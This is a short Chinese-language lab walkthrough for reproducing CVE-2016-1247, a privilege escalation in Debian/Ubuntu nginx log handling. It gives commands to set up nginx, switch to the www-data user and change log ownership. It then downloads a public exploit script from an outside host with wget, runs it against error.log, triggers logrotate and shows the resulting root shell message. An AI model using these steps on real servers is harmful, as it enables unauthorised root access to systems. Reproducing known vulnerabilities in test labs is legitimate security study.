Nginx权限提升漏洞  CVE-2016-1247



————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
0x001

环境搭建

测试环境：ubuntu 14.04.4

安装nginx服务

apt-get install nginx  -y


cat /etc/logrotate.d/nginx     //查看生成日志文件的配置文件

create 0640 www-data adm


logrotate -f /etc/logrotate.d/nginx    //nginx日志用logrotate命令自动切割




cat  /etc/passwd  |grep  www-data  //查看www-data权限

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
0x002  切换www-data 用户

su -s /bin/bash www-data   //root用户切换到www-data用户


sudo  su -s /bin/bash www-data   //普通用户ubunu切换到www-data用户


ls -ld /var/log/nginx/     查看日志文件的用户及组

drwxr-xr-x 2 root adm 4096  4月 19 21:41 /var/log/nginx/ 

ls -ld /var/log/nginx/*
-rw-r----- 1 www-data adm 0  4月 19 22:38 /var/log/nginx/access.log
-rw-r----- 1 www-data adm 0  4月 19 22:38 /var/log/nginx/error.log
  

chown www-data:adm  /var/log/nginx/ 

————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
0x003 下载nginx提权脚本poc

wget -P /tmp  http://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh &&cd /tmp &&chmod 777 nginxed-root.sh

-rwxrwxrwx  1 www-data www-data 7.1K  1月 14 13:03 nginxed-root.sh


[!] Exploit usage: 

./nginxed-root.sh path_to_error.log 




./nginxed-root.sh  /var/log/nginx/error.log


当出现
Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...  （用root权限执行）

logrotate -f /etc/logrotate.d/nginx

执行以后，www-data权限就提升成root了

The server is (N)jinxed ! ;) Got root via Nginx!





